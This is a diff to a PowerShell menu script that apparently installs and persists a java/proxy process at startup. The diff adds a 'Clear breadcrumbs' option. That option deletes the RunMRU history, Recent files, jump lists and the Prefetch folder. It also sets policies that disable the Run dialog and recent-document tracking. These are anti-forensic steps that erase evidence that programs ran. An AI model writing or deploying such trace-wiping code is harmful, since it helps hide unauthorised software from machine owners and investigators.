@@ -61,7 +61,8 @@ function Show-Menu {
     Write-Host "4. Show Status" -ForegroundColor White
     Write-Host "5. Reinstall" -ForegroundColor Magenta
     Write-Host "6. Remove from Startup" -ForegroundColor DarkYellow
-    Write-Host "7. Exit" -ForegroundColor Gray
+    Write-Host "7. Tweaks & Clear breadcrumbs" -ForegroundColor Yellow
+    Write-Host "0. Exit" -ForegroundColor Gray
     Write-Host ""
     Write-Host "Select an option (1-7): " -NoNewline -ForegroundColor White
 }
@@ -111,25 +112,25 @@ function Show-Status {
     
     # Installation check
     if (Test-Path $InstallPath) {
-        Write-Host "✓ Installed at: $InstallPath" -ForegroundColor Green
+        Write-Host "Installed at: $InstallPath" -ForegroundColor Green
     } else {
-        Write-Host "✗ Not installed" -ForegroundColor Red
+        Write-Host "Not installed" -ForegroundColor Red
     }
     
     # Startup check
     try {
         $regValue = Get-ItemProperty -Path $RegPath -Name $RegName -ErrorAction Stop
-        Write-Host "✓ In Startup" -ForegroundColor Green
+        Write-Host "In Startup" -ForegroundColor Green
     } catch {
-        Write-Host "✗ Not in Startup" -ForegroundColor Yellow
+        Write-Host "Not in Startup" -ForegroundColor Yellow
     }
     
     # Processes check
     $processes = Get-Process | Where-Object { $_.ProcessName -like "*java*" -or $_.ProcessName -like "*proxy*" }
     if ($processes) {
-        Write-Host "✓ Running (Processes found: $($processes.Count))" -ForegroundColor Green
+        Write-Host "Running (Processes found: $($processes.Count))" -ForegroundColor Green
     } else {
-        Write-Host "✗ Not running" -ForegroundColor Yellow
+        Write-Host "Not running" -ForegroundColor Yellow
     }
     
     # Show current username
@@ -282,6 +283,18 @@ do {
             Read-Host "Press Enter to continue"
         }
         "7" {
+            Clear-Host
+            Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -ErrorAction SilentlyContinue
+            Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" -Name "NoRun" -Value 1 -Type DWord
+            Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\*" -Force -ErrorAction SilentlyContinue
+            Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\AutomaticDestinations\*" -Force -ErrorAction SilentlyContinue
+            Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\CustomDestinations\*" -Force -ErrorAction SilentlyContinue
+            Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" -Name "NoRecentDocsHistory" -Value 1 -Type DWord
+            Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" -Name "Start_TrackDocs" -Value 0 -Type DWord
+            Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" -Name "Start_TrackProgs" -Value 0 -Type DWord
+            Remove-Item "C:\Windows\Prefetch\*" -Force -ErrorAction SilentlyContinue
+        }
+        "0" {
             Write-Host "Exiting..." -ForegroundColor Gray
             exit 0
         }
